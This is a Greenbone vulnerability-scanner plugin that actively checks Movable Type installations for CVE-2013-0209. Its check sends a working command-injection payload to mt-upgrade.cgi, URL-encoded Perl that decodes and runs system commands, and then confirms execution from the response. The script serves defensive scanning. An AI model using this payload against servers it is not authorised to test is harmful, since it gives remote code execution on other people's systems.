# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:sixapart:movable_type";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103651");
  script_version("2025-02-21T05:37:49+0000");
  script_tag(name:"last_modification", value:"2025-02-21 05:37:49 +0000 (Fri, 21 Feb 2025)");
  script_tag(name:"creation_date", value:"2013-01-31 13:27:06 +0100 (Thu, 31 Jan 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2013-0209");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Movable Type < 4.38 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_movable_type_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sixapart/movabletype/http/detected");

  script_tag(name:"summary", value:"Movable Type is prone to multiple SQL injection (SQLi) and
  command injection vulnerabilities because the application fails to properly sanitize
  user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to execute
  arbitrary code, compromise the application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Movable Type prior to version 4.38.");

  script_tag(name:"solution", value:"Update to version 4.38 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57490");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");
include("url_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = exploit_commands();

url = dir + "/mt-upgrade.cgi";

headers = make_array("Content-Type", "application/x-www-form-urlencoded");

foreach pattern (keys(cmds)) {
  cmd = base64(str: cmds[pattern]);
  cmd = urlencode(str: cmd);

  data = "%5f%5fmode=run%5factions&installing=1&steps=%5b%5b%22core%5fdrop%5fmeta%5ffor%5ftable%22%2c%22" +
         "class%22%2c%22v0%3buse%20MIME%3a%3aBase64%3bsystem%28decode%5fbase64%28q%28" + cmd +
         "%29%29%29%3breturn%200%22%5d%5d";

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    report = "It was possible to execute the '" + cmds[pattern] + "' command." +
             '\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
